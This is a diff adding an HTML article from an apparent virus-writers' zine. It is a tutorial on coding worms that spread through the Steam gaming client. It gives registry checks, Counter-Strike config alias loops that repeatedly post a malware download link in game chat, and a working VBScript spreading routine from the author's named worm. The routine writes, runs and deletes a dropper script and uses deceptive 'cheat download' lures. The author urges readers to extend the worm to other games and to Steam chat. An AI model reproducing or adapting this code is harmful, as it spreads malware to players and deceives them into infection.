@@ -1,0 +1,266 @@
+<html><head><title>EOF ISSUE #0x01</title>
+<style fprolloverstyle>A:hover {color: #D1F2C4; text-decoration: none}</style></head>
+<body text="#E0E0E0" bgcolor="#131313" link="#BFBFBF" vlink="#BFBFBF" alink="#BFBFBF" style="font-size: 10pt">
+
+<pre><hr>|| Author: sk0r,Czybik/EOF || <a style="text-decoration: none" href="../mainmenu/articles.htm"><span style="text-decoration: none">Back to articles</span></a> ||<hr></pre>
+<pre>
+||Spreading
+||via
+||Steam client
+||______________________________________
+------------------------------------------
+
++-----------------------------------------+
+|1: What is Steam?                        |+
+|2: About this tutorial                   |+
+|3: Explanation about this way to spread  |+
+|4: Example code in VB-Script             |+
+|5: The first Steam worms                 |+
+|6: Final words                           |+
+|7: About me                              |+
++-----------------------------------------++
+ +++++++++++++++++++++++++++++++++++++++++++
+
++-----------------------------------------------------+
+|Author: sk0r/Czybik                                  |+
+|Translated by: SkyOut                                |+
++-----------------------------------------------------++
+ +++++++++++++++++++++++++++++++++++++++++++++++++++++++
+
++-----------------------------------------------------+
+|www.sk0r-czybik.de.vu                                |+
+|www.eof-project.net                                  |+
++-----------------------------------------------------++
+ +++++++++++++++++++++++++++++++++++++++++++++++++++++++
+
+________________________________________________________________________________
+
+ =================
+|1: What is Steam?|
+ =================
+
+The Steam client is a program, which is used to play several online games, like
+famous games including Counter-Strike 1.6, Half-Life, Half-Life 2, Counter-Strike:
+Source, Day of Defeat etc...). Because of so many people using Steam, especially
+Counter-Strike 1.6 it's a very good way to spread. Steam always has the same folder
+structure and the path is contained in the Registry. Millions of people are using
+it, in Germany and the world, which makes it interesting for malware.
+How can a worm spread via Steam? It's similar to the way IM-worms (Instant Messenger)
+spread, normally IM-worms send links to all contact in ICQ or MSN. The same with
+Steam. We send links in the InGame chat with a special time delay. So in its structure,
+Steam worms are IM-worms ;)
+
+ ======================
+|2: About this tutorial|
+ ======================
+
+This tutorial was originally written by sk0r/Czybik in 2006.
+Why did i write this tutorial? Because of the millions of people using this client,
+(even in Germany). So I decided to start coding a Steam worm. The first worm, coded
+in VB-Script was not able to spread via Steam, my third worm was able to do so. So,
+if you start coding a new worm with many spreading functions, why not code one for
+Steam, too? ;)
+
+ =======================================
+|3: Explanation about this way to spread|
+ =======================================
+
+OK, now I will explain how you can make your worm spread via Steam. I will explain
+this in general, not language specific, so everyone can understand and use it. In
+next chapter you will find a code example in VB-Script. Let's go:
+First we have to make sure Steam is really installed on the system, therefore you
+can check the following Registry key:
+
++-------------------------------------------------------------------------+
+|                                                                         |
+|HKEY_LOCAL_MACHINE\SOFTWARE\Valve\Steam\InstallPath                      |
+|                                                                         | 
++-------------------------------------------------------------------------+
+
+It is a REG_SZ value, also called string. Just make some simple IF-Function to
+check whether the key exists or not. If yes, you can be sure Steam is installed
+and you have the path to the Steam folder ;)
+Now we want to make the worm spread via Counter-Strike 1.6. If you understand how
+to do this it is easy for you to code own functions to spread over other games, too.
+Just do it over some IF-Functions. So, now you have the Steam path in a variable,
+the next we get are one or more folders, named after the account names the user
+is containing. Write some functions to check every folder in SteamApps for a folder
+named like:
+
++-----------------------------------------------------------+
+|                                                           |
+|VariableName + &quot;\counter-strike\cstrike&quot;                   |
+|                                                           |
++-----------------------------------------------------------+
+
+If you find such a folder, Counter-Strike 1.6 is installed on the system. Now we
+come to the part, where you have to manipulate the config file to paste the link
+to the worm into the chat. Therefore we must use the Userconfig.cfg. Check if the
+file really exists, if not, just create one. The big advantage about this file is,
+that it gets executed by steam InGame. You could also try to manipulate the Autoexec.cfg,
+Valve.rc or Config.cfg, but be sure to make the Config.cfg &quot;readonly&quot;. Another way
+would be to make another config file, which will be started by Userconfig.cfg, the
+command would look like this:
+
++-------------------------------------+
+|                                     |
+|exec &quot;ConfigName.cfg&quot;;               |
+|                                     |
++-------------------------------------+
+
+Just add this string to the end of the Userconfig.cfg, it won't be easy to recognize.
+Now, what do we need to write into the config file to spread our worm?
+Therefore we need a Sleep-Command, Say-Command and so called &quot;aliases&quot;. The Sleep-Command
+is just send by &quot;Echo&quot; into the console. Do some function to make this several times
+and you have MUCH time. With the Say-Command we paste our link into the InGame chat.
+With the Alias-Command we can make a loop. Now the command pasting the link into
+the chat, as alias:
+
++--------------------------------------------------------------------------------------------+
+|                                                                                            |
+|alias &quot;alString&quot; &quot;say Mit%dem%Tool%koennt%ihr%alle%ownen:%www.link.de/too.zip&quot;;             |
+|                                                                                            |
++--------------------------------------------------------------------------------------------+
+
+Now the variable &quot;alString&quot; contains the Say-Command. We will need this later for
+our loop function. The % signs will be whitespaces in the chat and not be shown like
+this. Always use it like this, to be sure all will work. Now our Sleep-Command:
+
++-------------------------------------------------------------+
+|                                                             |
+|alias &quot;cmdSleep&quot; &quot;echo You%are%infected!&quot;;                   |
+|                                                             |
++-------------------------------------------------------------+
+
+The same as the one above, the only difference is, that the sentence is written into
+the console. The console is hidden if not activated by the user manually (by pressing
+a special key), while playing it is very annoying =). Now lets do some loop function.
+We have a little delay before the sentence is written into the chat (names of variables 
+changed here):
+
++--------------------------------------------------------------------------------------------------------------------------------+
+|                                                                                                                                |
+|alias &quot;SkorWrite&quot; &quot;say http://encryboy.en.funpic.de/Cstrike_Tweaks.zip &lt;= The best Tweak Tool&quot;; alias &quot;SkorSleep&quot;               |
+|&quot;echo You are infected with Win32.SkorSteamAttacker-A by sk0r (Czybik)&quot;; alias &quot;SkorGo&quot; &quot;SkorAn&quot;; alias &quot;SkorAn&quot;                |
+|&quot;SkorWrite; alias SkorGo SkorAus&quot;; alias &quot;SkorAus&quot; &quot;SkorSleep; alias SkorGo SkorSchmaus&quot;; alias &quot;SkorSchmaus&quot;                   |
+|&quot;SkorSleep; alias SkorGo SkorLaus&quot;; alias &quot;SkorLaus&quot; &quot;SkorSleep; alias SkorGo SkorKaus&quot;; alias &quot;SkorKaus&quot;                       |
+|&quot;SkorSleep; alias SkorGo SkorSaus&quot;; alias &quot;SkorSaus&quot; &quot;SkorSleep; alias SkorGo SkorBraus&quot;; alias &quot;SkorBraus&quot;                     |
+|&quot;SkorSleep; alias SkorGo SkorXaus&quot;; alias &quot;SkorXaus&quot; &quot;SkorSleep; alias SkorGo SkorZaus&quot;; alias &quot;SkorZaus&quot;                       |
+|&quot;SkorSleep; alias SkorGo SkorAn&quot;; alias &quot;m_pitch&quot; &quot;SkorGo&quot;;                                                                     |
+|                                                                                                                                |
++--------------------------------------------------------------------------------------------------------------------------------+
+
+This might look quite difficult^^, but it is really easy:
+The variable &quot;SkorWrite&quot; is the sentence for the InGame chat, which should spread
+our worm. The variable &quot;SkorSleep&quot; write some sentence into the console to sleep. Most
+people won't recognize. The variable &quot;SkorGo&quot; is containing the variable starting the loop,
+look at the &quot;m_pitch&quot; command. This will executed InGame every 0.5 seconds. That's
+why the loop is &quot;on&quot; (german &quot;an&quot; (SkorAn) = &quot;on&quot;). The loop (m_pitch) executes the
+&quot;SkorGo&quot; command every 0.5 seconds, therefore we must change the &quot;SkorGo&quot; command every
+time, we do this this way: The variable &quot;SkorAn&quot; write the sentence into the InGame chat
+and changes the variable &quot;SkorGo&quot; into &quot;SkorAus&quot; (german &quot;aus&quot; = &quot;off&quot;). &quot;SkorAus&quot;
+contains our Sleep-Command and could change &quot;SkorGo&quot; into &quot;SkorAn&quot; again. Then the
+sentence would be written every 1.5 seconds (if im right ;P) into the InGame chat.
+This wouldn't be very good for the user because the chat would be flooded with messages.
+Then the admin might kick him or some automated Anti-Spam tool or, which will happen
+in most cases, he can't write anything anymore. Therefore we change &quot;SkorAus&quot; into
+other commands, to make it &quot;sleep&quot;. The last sleep variable changes &quot;SkorGo&quot; to
+&quot;SkorAn&quot; again and the sentence will be written into the chat again ;).
+See, wasn't that easy :D
+If you are able to do all this now, it shouldn't be a problem for you to make
+your worm spread over other games, too. The folder structure is always like this:
+
++-------------------------------------------------------------+
+|                                                             |
+|VariableName + &quot;\%ModName%\%CfgFolder%\                      |
+|                                                             |
++-------------------------------------------------------------+
+
+ ============================
+|4: Example code in VB-Script|
+ ============================
+
+In the following example you see the spreading function of the
+Win32.HLLW.Steam.B, also known as Win32.SkorSteam.B, worm:
+
++-----------------------------------------------------------------------------------------------------------------------------------+
+|                                                                                                                                   |
+|SteamPath = wshs.regread(&quot;HKEY_LOCAL_MACHINE\SOFTWARE\Valve\Steam\&quot; &amp; &quot;InstallPath&quot;) Randomize:                                    |
+|intNumberRandoom = Int(7 * Rnd) + 1 If intNumberRandoom = 1 Then ChatMessage = &quot;World biggest cfg and priv hack                    |
+|summarize!&quot; ElseIf intNumberRandoom = 2 Then ChatMessage = &quot;Download original Xs1cht and Headstyle Rc!!&quot; ElseIf                    |
+|intNumberRandoom = 3 Then ChatMessage = &quot;Orgia Crack v10 working!! Download it and own!&quot; ElseIf                                    |
+|intNumberRandoom = 4 Then ChatMessage = &quot;Pixelaimbot v5.2 working (undetectable) downlaod!&quot; ElseIf                                 |
+|intNumberRandoom = 5 Then ChatMessage = &quot;Download 1337 Config by Mouz|Jonny (Original, no fake!!)&quot; ElseIf                          |
+|intNumberRandoom = 6 Then ChatMessage = &quot;h4xx0r sound config download! Better then A3D 2.0 (working)&quot; ElseIf                       |
+|intNumberRandoom = 7 Then ChatMessage = &quot;download priv config h4xx0r maker by hirsche! (no fake)&quot; Else                             |
+|ChatMessage = &quot;download private optimizer by z0rr0.. kommt viel mehr an (geht wirklich!!)&quot; End If Set crtSteamVbs =                |
+|fso.createtextfile(SteamPath + &quot;\SteamApps\sk0rSteamAttacker.vbs&quot;, True) With crtSteamVbs .writeline (&quot;Rem                         |
+|Win32/SkorSteamAttacker-A Spreading Script file&quot;) .writeline (&quot; &quot;) .writeline (&quot;On Error Resume Next&quot;) .writeline (&quot;Set            |
+|fso = CreateObject(&quot;&quot;scripting.filesystemobject&quot;&quot;)&quot;) .writeline (&quot;Set wshs = CreateObject(&quot;&quot;wscript.shell&quot;&quot;)&quot;) .writeline          |
+|(&quot;SteamPath = wshs.regread(&quot;&quot;HKEY_LOCAL_MACHINE\SOFTWARE\Valve\Steam\&quot;&quot; &amp; &quot;&quot;InstallPath&quot;&quot;)&quot;) .writeline                            |
+|(&quot;Set getfldr = fso.getfolder(SteamPath + &quot;&quot;\SteamApps&quot;&quot;)&quot;) .writeline (&quot;For Each UserAcc In getfldr.subfolders&quot;)                  |
+|.writeline (&quot;If fso.folderexists(UserAcc.Path + &quot;&quot;\counter-strike\cstrike&quot;&quot;) Then&quot;) .writeline (&quot;If Not                            |
+|fso.fileexists(UserAcc.Path + &quot;&quot;\counter-strike\cstrike\userconfig.cfg&quot;&quot;) Then&quot;) .writeline (&quot;Set usercfg =                        |
+|fso.createtextfile(UserAcc.Path + &quot;&quot;\counter-strike\cstrike\userconfig.cfg&quot;&quot;)&quot;) .writeline (&quot;usercfg.writeline (&quot;&quot;//first          |
+|created&quot;&quot;)&quot;) .writeline (&quot;usercfg.Close&quot;) .writeline (&quot;End If&quot;) .writeline (&quot;Set openusercfg =                                     |
+|fso.opentextfile(UserAcc.Path + &quot;&quot;\counter-strike\cstrike\userconfig.cfg&quot;&quot;, 2, True)&quot;) .writeline (&quot;openusercfg.write              |
+|(&quot;&quot;//Win32.SkorSteamAttacker-A Cs-Script File (Like IM-Worms)&quot;&quot; + vbCrLf)&quot;) .writeline (&quot;openusercfg.write                         |
+|(&quot;&quot;//===========================================&quot;&quot; + vbCrLf)&quot;) .writeline                                                          |
+|(&quot;openusercfg.write (&quot;&quot;//Begin Config h4xx0ring:&quot;&quot; + vbCrLf)&quot;) .writeline (&quot;openusercfg.write (&quot;&quot;alias                             |
+|&quot;&quot;&quot;&quot;SkorWrite&quot;&quot;&quot;&quot; &quot;&quot;&quot;&quot;say http://encryboy.en.funpic.de/Cstrike_Tweaks.zip &lt;= &quot; + ChatMessage + &quot; &quot;&quot;&quot;&quot;;&quot;&quot; +                         |
+|vbCrLf)&quot;) .writeline (&quot;openusercfg.write (&quot;&quot;alias &quot;&quot;&quot;&quot;SkorSleep&quot;&quot;&quot;&quot; &quot;&quot;&quot;&quot;echo You are infected with                                 |
+|Win32.SkorSteamAttacker-A by sk0r (Daniel)&quot;&quot;&quot;&quot;;&quot;&quot; + vbCrLf)&quot;) .writeline (&quot;openusercfg.write (&quot;&quot;alias                              |
+|&quot;&quot;&quot;&quot;SkorGo&quot;&quot;&quot;&quot; &quot;&quot;&quot;&quot;SkorAn&quot;&quot;&quot;&quot;;&quot;&quot; + vbCrLf)&quot;) .writeline (&quot;openusercfg.write (&quot;&quot;alias &quot;&quot;&quot;&quot;SkorAn&quot;&quot;&quot;&quot;                                |
+|&quot;&quot;&quot;&quot;SkorWrite; alias SkorGo SkorAus&quot;&quot;&quot;&quot;;&quot;&quot; + vbCrLf)&quot;) .writeline (&quot;openusercfg.write (&quot;&quot;alias &quot;&quot;&quot;&quot;SkorAus&quot;&quot;&quot;&quot;                     |
+|&quot;&quot;&quot;&quot;SkorSleep; alias SkorGo SkorSchmaus&quot;&quot;&quot;&quot;;&quot;&quot; + vbCrLf)&quot;) .writeline (&quot;openusercfg.write (&quot;&quot;alias                                 |
+|&quot;&quot;&quot;&quot;SkorSchmaus&quot;&quot;&quot;&quot; &quot;&quot;&quot;&quot;SkorSleep; alias SkorGo SkorLaus&quot;&quot;&quot;&quot;;&quot;&quot; + vbCrLf)&quot;) .writeline (&quot;openusercfg.write                         |
+|(&quot;&quot;alias &quot;&quot;&quot;&quot;SkorLaus&quot;&quot;&quot;&quot; &quot;&quot;&quot;&quot;SkorSleep; alias SkorGo SkorKaus&quot;&quot;&quot;&quot;;&quot;&quot; + vbCrLf)&quot;) .writeline (&quot;openusercfg.write                   |
+|(&quot;&quot;alias &quot;&quot;&quot;&quot;SkorKaus&quot;&quot;&quot;&quot; &quot;&quot;&quot;&quot;SkorSleep; alias SkorGo SkorSaus&quot;&quot;&quot;&quot;;&quot;&quot; + vbCrLf)&quot;) .writeline (&quot;openusercfg.write                   |
+|(&quot;&quot;alias &quot;&quot;&quot;&quot;SkorSaus&quot;&quot;&quot;&quot; &quot;&quot;&quot;&quot;SkorSleep; alias SkorGo SkorBraus&quot;&quot;&quot;&quot;;&quot;&quot; + vbCrLf)&quot;) .writeline (&quot;openusercfg.write                  |
+|(&quot;&quot;alias &quot;&quot;&quot;&quot;SkorBraus&quot;&quot;&quot;&quot; &quot;&quot;&quot;&quot;SkorSleep; alias SkorGo SkorXaus&quot;&quot;&quot;&quot;;&quot;&quot; + vbCrLf)&quot;) .writeline (&quot;openusercfg.write                  |
+|(&quot;&quot;alias &quot;&quot;&quot;&quot;SkorXaus&quot;&quot;&quot;&quot; &quot;&quot;&quot;&quot;SkorSleep; alias SkorGo SkorZaus&quot;&quot;&quot;&quot;;&quot;&quot; + vbCrLf)&quot;) .writeline (&quot;openusercfg.write                   |
+|(&quot;&quot;alias &quot;&quot;&quot;&quot;SkorZaus&quot;&quot;&quot;&quot; &quot;&quot;&quot;&quot;SkorSleep; alias SkorGo SkorAn&quot;&quot;&quot;&quot;;&quot;&quot; + vbCrLf)&quot;) .writeline (&quot;openusercfg.write                     |
+|(&quot;&quot;alias &quot;&quot;&quot;&quot;m_pitch&quot;&quot;&quot;&quot; &quot;&quot;&quot;&quot;SkorGo&quot;&quot;&quot;&quot;;&quot;&quot; + vbCrLf)&quot;) .writeline (&quot;openusercfg.write (&quot;&quot;s_enable_a3d;&quot;&quot; +                         |
+|vbCrLf)&quot;) .writeline (&quot;openusercfg.write (&quot;&quot;s_a3d &quot;&quot;&quot;&quot;1&quot;&quot;&quot;&quot;; alias s_a3d;&quot;&quot; + vbCrLf)&quot;) .writeline (&quot;openusercfg.write             |
+|(&quot;&quot;rate &quot;&quot;&quot;&quot;7500&quot;&quot;&quot;&quot;;&quot;&quot; + vbCrLf)&quot;) .writeline (&quot;openusercfg.write (&quot;&quot;//End Config h4xx0ring&quot;&quot; + vbCrLf)&quot;)                         |
+|.writeline (&quot;openusercfg.write (&quot;&quot;//===========================================&quot;&quot; +                                                |
+|vbCrLf)&quot;) .writeline (&quot;openusercfg.write (&quot;&quot;//Win32.SkorSteamAttacker-A Cs-Script File (Like IM-Worms)&quot;&quot; + vbCrLf)&quot;)               |
+|.writeline (&quot;End If&quot;) .writeline (&quot;Next&quot;) .Close End With wshs.run (SteamPath + &quot;\SteamApps\sk0rSteamAttacker.vbs&quot;), ,             |
+|True fso.deletefile (SteamPath + &quot;\SteamApps\sk0rSteamAttacker.vbs&quot;)                                                               |
+|                                                                                                                                   |
++-----------------------------------------------------------------------------------------------------------------------------------+
+
+ ========================
+|5: The first Steam worms|
+ ========================
+
+The first Steam worms were done by me :D
+The first Steam worm, a VB-Script worm, attacked the program and changed Registry
+values. This resulted in a long update time before it was possible to play. It
+was quite simple and did not spread via Steam. The second Steam worm, also my creation,
+attacked Steam a bit harder, I found more things to attack and modify :D. He simulated
+a Cfg-Maker. The third one contained many functions to attack Steam. He used everything,
+which was known AND it was the first Steam worm also spreading via Steam, InGame
+chat, like IM-Worms do.
+
+ ==============
+|6: Final words|
+ ==============
+
+Now you are able to code worms spreading via Steam. Now try to improve this by using
+your fantasy. For example make the worm spread over all games or try to find out
+how to spread the worm with the Steam chat program &quot;Friends&quot; ;). If you have any
+questions about Steam, this tutorial or anything related to this spreading method,
+then feel free to contact me, information written below. If you have good suggestions
+for new Steam worms, let me know.
+
+ ===========
+|7: About me|
+ ===========
+
+For question about Steam, the spreading method, if you have found something new or
+if you just want to show me your Steam worm sources, then you can write an Email
+to sk0r1337@gmx.de or write into the guestbook of my homepage, best regards sk0r/Czybik.
+
+Or write to me in IRC: #vxers, #vx-lab and #eof-project @ Undernet
+</pre></body></html>
